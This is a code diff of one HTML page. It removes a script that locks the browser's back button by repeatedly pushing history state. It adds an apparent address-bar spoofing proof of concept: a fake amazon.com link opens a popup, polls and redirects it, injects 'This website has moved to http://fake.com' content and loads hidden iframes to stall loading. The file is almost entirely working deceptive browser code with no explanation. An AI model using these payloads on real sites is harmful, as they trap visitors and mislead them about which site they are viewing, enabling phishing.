@@ -1,48 +1,77 @@
-<!DOCTYPE html>
-<html>
-<head>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Back Lock Strong</title>
-</head>
-<body>
 
-<h2>Back Button Locked</h2>
-<button onclick="triggerShare()">Share</button>
+<body>
+<a id=test href="https://www.amazon.com/" onclick=foo()>https://www.amazon.com/</a>
+</body>
 
 <script>
-function lockBack() {
-    // Push state awal
-    history.pushState(null, null, location.href);
 
-    // Setiap kali back ditekan
-    window.addEventListener('popstate', function () {
-        // Push lagi supaya tidak bisa mundur
-        history.pushState(null, null, location.href);
-    });
+var w;
+var t;
+var z;
+
+if(location.href.indexOf("fake") !== -1){
+document.body.innerHTML = "<h1>This website has moved to http://fake.com</h1>";
 }
 
-// Versi lebih agresif
-function aggressiveLock() {
-    setInterval(() => {
-        history.pushState(null, null, location.href);
-    }, 1000);
+
+function foo(){
+
+document.getElementById("test").href="#";
+
+w = window.open("?fake");
+
+t = setInterval('bar()',1);
+
 }
 
-function triggerShare() {
-    if (navigator.share) {
-        navigator.share({
-            title: 'Locked Page',
-            text: 'Back button is locked',
-            url: location.href
-        }).catch(()=>{});
-    }
+function bar(){
+
+if(w.location.href !== 'about:blank'){
+
+alert("Redirecting");
+
+document.body.innerHTML = "<h1>Redirecting</h1>";
+
+slow();
+
+w.location.href = 'https://www.amazon.com/';
+
+clearInterval(t);
+
+z = setInterval('baz()',1);
+
 }
 
-// Aktifkan lock
-lockBack();
-aggressiveLock();
+}
+
+function baz(){
+try{
+w.location.href !== 'about:blank';
+}
+catch (e){
+
+//stop page loading
+w.location.href='https://www.google.com/csi';
+clearInterval(z);
+
+//Make sure the old content is not cleared
+setTimeout("alert('ok');window.location.href='about:blank';window.close();", 3000);
+}
+
+}
+
+
+//slow down the website
+function slow() {
+for (i=0; i<10; i++ ) {
+
+iframe = document.createElement("iframe");
+iframe.src = 'https://www.amazon.com/';
+iframe.style = 'display:none';
+document.body.appendChild(iframe);
+
+}
+}
 
 </script>
 
-</body>
-</html>
